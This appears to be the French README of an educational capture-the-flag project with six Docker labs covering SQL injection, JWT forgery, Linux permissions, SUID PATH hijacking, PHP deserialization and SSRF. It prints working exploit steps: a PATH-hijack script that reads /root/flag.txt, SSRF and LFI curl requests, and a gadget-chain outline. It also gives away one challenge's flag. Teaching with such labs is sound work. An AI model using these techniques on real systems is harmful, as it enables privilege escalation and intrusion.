# CTF Project - Capture The Flag Challenges

Bienvenue dans ce projet de Capture The Flag (CTF) éducatif ! Ce projet contient 6 challenges de cybersécurité progressifs testant différentes vulnérabilités et techniques d'exploitation.

## 📊 Vue d'ensemble des Challenges

| # | Nom | Type | Difficulté | Description |
|---|-----|------|-----------|-------------|
| 1 | Web SQL Injection | Web Security | 🟢 **Facile** | Web fuzzing et injections SQL |
| 2 | JWT Leak | Web Security | 🟡 **Moyen** | Fuite de secrets JWT et path traversal |
| 3 | Linux Permissions | Linux Security | 🟢 **Facile** | Exploitation des permissions Linux |
| 4 | Linux SUID | Linux Security | � **Hardcore** | PATH hijacking et binaires SUID |
| 5 | PHP Object Injection | Web Security | 🔴 **Hardcore** | Désérialisation PHP et RCE |
| 6 | API SSRF | Web Security | 🟡 **Moyen** | Server-Side Request Forgery dans microservices |

---

## 🟢 NIVEAU FACILE

### CTF-1: Web SQL Injection

**Difficulté:** 🟢 Facile (1/3)

**Description:**
Ce premier challenge introduit les concepts fondamentaux de Web Fuzzing et d'injections SQL. L'application Web contient des formulaires vulnérables exploitables via des techniques d'injection SQL classiques.

**Technologies:**
- PHP
- MySQL
- Apache
- Docker

**Concepts testés:**
- Web fuzzing et reconnaissance
- Injections SQL basiques
- Manipulation de requêtes SQL
- Extraction d'informations de base de données

**Lancement:**
```bash
cd CTF/CTF-1-web-sqli-ctf
docker build -t ctf-web-sqli .
docker run --rm -p 8080:80 ctf-web-sqli
```

**Accès:**
- URL: `http://localhost:8080`

**Fichiers importants:**
- `create_db.php`: Création et initialisation de la base de données
- `index.php`: Page d'accueil vulnérable
- `administrator.php`: Panel admin vulnérable
- `order.php`: Système de commandes vulnérable

---

### CTF-3: Linux Permissions

**Difficulté:** 🟢 Facile (1/3)

**Description:**
Ce challenge enseigne les bases des permissions Linux. Le but est de trouver un flag caché dans un fichier `.secret.txt` en explorant intelligemment le système de fichiers du conteneur Docker.

**Technologies:**
- Linux (Ubuntu)
- Bash scripting
- Docker

**Concepts testés:**
- Permissions Linux (rwx)
- Navigation système
- Lecture de fichiers avec restrictions
- Énumération basique du système

**Lancement:**
```bash
cd CTF/CTF-3-linux-permissions
docker-compose up -d --build
docker exec -it ctf3-linux-permissions /bin/bash
```

**Ou directement:**
```bash
docker build -t ctf-linux-permissions .
docker run -it ctf-linux-permissions
```

**Objectif:**
- Lire le fichier `.secret.txt` contenant le flag
- L'accès direct est restreint, il faut contourner les permissions

**Indices:**
- Un fichier `helper.py` dans `/app` donne des indices progressifs
- Examiner les permissions avec `ls -la`
- Chercher des chemins alternatifs vers le flag

---

## 🟡 NIVEAU MOYEN

### CTF-2: JWT Leak

**Difficulté:** 🟡 Moyen (2/3)

**Description:**
Ce challenge combine plusieurs vulnérabilités Web: fuites de secrets, path traversal, et manipulation de JWT (JSON Web Tokens). L'application expose accidentellement ses secrets de configuration et les JWT peuvent être forgés.

**Technologies:**
- Python (Flask)
- JavaScript (Vite + React)
- JWT (JSON Web Tokens)
- Docker Compose

**Concepts testés:**
- Reconnaissance de l'API
- Path traversal/LFI (Local File Inclusion)
- Fuites de fichiers sensibles (.env)
- Manipulation et forgerie de JWT
- Authentication bypass

**Architecture:**
```
Backend: Flask API (Port 8080)
Frontend: Vite + React (Port 5174)
```

**Lancement:**
```bash
cd CTF/CTF-2-jwt-leak
docker-compose up -d --build
```

**Accès:**
- Frontend: `http://localhost:5174`
- Backend API: `http://localhost:8080`

**Objectif:**
- Récupérer le flag en obtenant un JWT valide avec le rôle `admin`
- Exploiter les vulnérabilités pour accéder aux secrets de configuration

**Vulnérabilités clés:**
1. **Path Traversal**: L'endpoint `/api/download?file=` n'est pas sécurisé
2. **Fuite d'env**: Le fichier `.env` contient la clé secrète JWT
3. **JWT Forgery**: Une fois la clé secrète obtenue, créer un token admin

**Endpoints utiles:**
- `GET /api/download?file=README.txt` - Télécharger des fichiers
- `GET /api/admin` - Endpoint protégé (nécessite JWT admin)

---

### CTF-6: API SSRF & Microservices

**Difficulté:** 🟡 Moyen (2/3)

**Description:**
Ce challenge teste l'exploitation de vulnérabilités SSRF (Server-Side Request Forgery) dans une architecture microservices. Le flag est stocké dans un service interne non exposé directement, accessible uniquement via SSRF.

**Technologies:**
- Python (Flask)
- Docker Compose
- Architecture microservices
- Docker networking

**Architecture:**
```
Gateway (Port 8080)
  └─> Internal-Flag Service (Port 8001 - non exposé publiquement)
```

**Concepts testés:**
- Server-Side Request Forgery (SSRF)
- Architecture microservices
- Reconnaissance d'API
- Contournement de restrictions d'accès
- Exploitation via requêtes internes

**Lancement:**
```bash
cd CTF/CTF-6-api-ssrf
docker-compose up -d --build
```

**Accès:**
- Gateway: `http://localhost:8080`
- Internal API: `http://localhost:8001` (seulement depuis le conteneur)

**Objectif:**
Récupérer le flag stocké dans le service interne en exploitant une vulnérabilité SSRF dans la gateway.

**Technique d'exploitation - SSRF:**

L'idée est d'utiliser le service gateway pour faire des requêtes vers le service interne:

```bash
# Vérifier ce que la gateway expose
curl http://localhost:8080

# Tenter une SSRF vers le service interne
curl 'http://localhost:8080/proxy?url=http://internal-flag:8001/flag'
```

**Points clés:**
1. Le service interne n'est pas accessible directement depuis votre machine
2. Le service gateway a accès au réseau interne Docker
3. Une vulnérabilité SSRF dans la gateway permet de lui faire faire des requêtes
4. Par défaut, les conteneurs Docker peuvent se résoudre par nom: `internal-flag:8001`

**Outils utiles:**
- `curl` pour tester les requêtes
- `docker-compose logs` pour déboguer
- `docker exec` pour inspecter les conteneurs

---

## 🔴 NIVEAU HARDCORE

### CTF-4: Linux SUID & PATH Hijacking

**Difficulté:** 🔴 Hardcore (3/3)

**Description:**
Ce challenge avancé enseigne les techniques d'élévation de privilèges via l'exploitation de binaires SUID et le PATH hijacking. Le but est de lire `/root/flag.txt` en exploitant un binaire vulnérable.

**Flag:** `CTF{path_hijacking_and_permissions_master}`

**Technologies:**
- Linux (Ubuntu)
- C (binaires compilés)
- Bash scripting
- Docker

**Concepts testés:**
- Bit SUID et escalade de privilèges
- Variable PATH et ordre de recherche
- Analyse de binaires (strings, ltrace, strace)
- Création de faux binaires
- PATH injection attacks

**Lancement:**
```bash
cd CTF/CTF-4-linux-suid
docker-compose up -d --build
docker exec -it ctf4-linux-suid /bin/bash
```

**Qu'est-ce qu'un binaire SUID ?**

SUID (Set User ID) permet à un binaire de s'exécuter avec les privilèges de son propriétaire:
```bash
-rwsr-xr-x 1 root ctfgroup 12345 check_system
```
- Le `s` dans `rws` indique le bit SUID
- Quand exécuté, le binaire tourne avec les privilèges de `root`

**Technique d'exploitation - PATH Hijacking:**

1. **Énumération** - Trouver les binaires SUID:
```bash
find / -perm -4000 2>/dev/null
```

2. **Analyse** - Voir quelles commandes le binaire appelle:
```bash
strings /usr/local/bin/check_system
```

3. **Exploitation** - Créer un faux binaire:
```bash
mkdir -p /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/whoami
echo 'cat /root/flag.txt' >> /tmp/hijack/whoami
chmod +x /tmp/hijack/whoami
export PATH=/tmp/hijack:$PATH
/usr/local/bin/check_system
```

**Indices progressifs:**
1. Chercher les binaires SUID dans `/usr/local/bin/`
2. Analyser avec `strings` pour trouver les appels `system()`
3. Créer des commandes malveillantes sans chemin absolu
4. Manipuler la variable PATH

### CTF-5: PHP Object Injection

**Difficulté:** 🔴 Hardcore (3/3)

**Description:**
Ce challenge avancé teste la désérialisation PHP non sécurisée. L'application expose involontairement son code source via LFI, révélant une vulnérabilité de désérialisation permettant une RCE (Remote Code Execution) complète.

**Technologies:**
- PHP 8.1
- Apache
- Docker

**Architecture:**
- Web service: Apache + PHP 8.1 avec sessions en Base64
- Flag stocké dans `/flag.txt` (accessible après RCE)

**Concepts testés:**
- Local File Inclusion (LFI) - Découverte de vulnérabilités
- Désérialisation PHP non sécurisée
- Gadget chains
- Remote Code Execution (RCE)
- Manipulation de cookies encodés

**Lancement:**
```bash
cd CTF/CTF-5-php-object-injection
docker-compose up -d --build
# Ou directement
docker build -t ctf-php-injection .
docker run -p 8005:80 ctf-php-injection
```

**Accès:**
- URL: `http://localhost:8005`

**Étapes d'exploitation:**

**1️⃣ Découverte via LFI**
L'application expose un paramètre `?source=` qui retourne le code en Base64:
```bash
curl 'http://localhost:8005/index.php?source=classes'
curl 'http://localhost:8005/index.php?source=index'
```

**2️⃣ Analyse du code**
Le fichier `index.php` utilise `unserialize()` sans validation:
```php
$decoded_data = base64_decode($_COOKIE['session_data'], true);
$session = unserialize($decoded_data);  // ⚠️ Vulnérable !
```

**3️⃣ Identification de la Gadget Chain**
La classe `FileLogger` contient `__destruct()` permettant l'écriture de fichiers:
```php
class FileLogger {
    public $logFile;
    public $message;
    
    public function __destruct() {
        file_put_contents($this->logFile, $this->message);
    }
}
```

**4️⃣ Construction de la Payload**
Créer un objet sérialisé qui exploite la chaîne de gadgets pour exécuter du code.

**Fichiers importants:**
- `index.php`: Application principale avec LFI intentionnelle
- `classes.php`: Définition des classes vulnérables
- `shell.php`: Webshell (à créer via RCE)

**Documentation supplémentaire:**
- `EXPLOIT_GUIDE.md`: Guide détaillé d'exploitation
- `WALKTHROUGH.md`: Walkthrough complet
- `SUMMARY.md`: Résumé des concepts

---

## 🛠️ Prérequis

Tous les challenges nécessitent:

- **Docker** (version 20.10+)
- **Docker Compose** (version 1.29+)
- **Tools optionnels**:
  - `curl` ou `Postman` pour tester les APIs
  - `strings` et `ltrace` pour analyser les binaires
  - Éditeur texte ou IDE

**Installation:**
```bash
# macOS avec Homebrew
brew install docker-compose

# Linux (Ubuntu/Debian)
sudo apt-get install docker.io docker-compose
```

---

## 🚀 Quick Start

```bash
# Cloner le projet
cd /path/to/CTF-Project-Software-security

# Lancer un challenge spécifique
cd CTF/CTF-1-web-sqli-ctf
docker-compose up -d --build

# Arrêter les services
docker-compose down
```

---

## 📚 Progression recommandée

1. **Commencer par les challenges FACILES:**
   - CTF-1: Web SQL Injection
   - CTF-3: Linux Permissions

2. **Progresser aux challenges MOYENS:**
   - CTF-2: JWT Leak
   - CTF-6: API SSRF & Microservices

3. **Maîtriser les challenges HARDCORE:**
   - CTF-4: Linux SUID & PATH Hijacking
   - CTF-5: PHP Object Injection

---

## 🎓 Concepts clés par domaine

### Web Security
- SQL Injection (SQLi)
- Local File Inclusion (LFI)
- Path Traversal
- JWT (JSON Web Tokens)
- Authentication & Authorization
- PHP Deserialization
- Remote Code Execution (RCE)
- Server-Side Request Forgery (SSRF)

### Linux Security
- File Permissions (rwx)
- SUID Bit Exploitation
- PATH Variable Manipulation
- Privilege Escalation
- System Enumeration

### General
- Docker & Containerization
- Microservices Architecture
- API Security
- Reconnaissance
- Exploitation Techniques

---

## 🐛 Troubleshooting

### Le port est déjà utilisé
```bash
# Trouver et arrêter le service utilisant le port
lsof -i :8080
kill -9 <PID>

# Ou utiliser un port différent
docker run -p 9090:80 ctf-web-sqli
```

### Erreurs Docker
```bash
# Forcer la reconstruction
docker-compose up -d --build --force-recreate

# Voir les logs
docker-compose logs -f

# Nettoyer complètement
docker-compose down -v
docker system prune -a
```

### Problèmes de connexion
```bash
# Vérifier les services actifs
docker ps

# Inspecter la configuration réseau
docker network ls
docker network inspect ctf_default
```

---

## 📝 Notes importantes

- 📖 Consulter les waklthrough si vous êtes bloqués
- 🎯 L'objectif est d'apprendre les concepts de sécurité, pas juste d'obtenir le flag

---

## 📞 Ressources supplémentaires

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PHP Security](https://www.php.net/manual/en/security.php)

---

**Bonne chance et amusez-vous à explorer! 🎯**
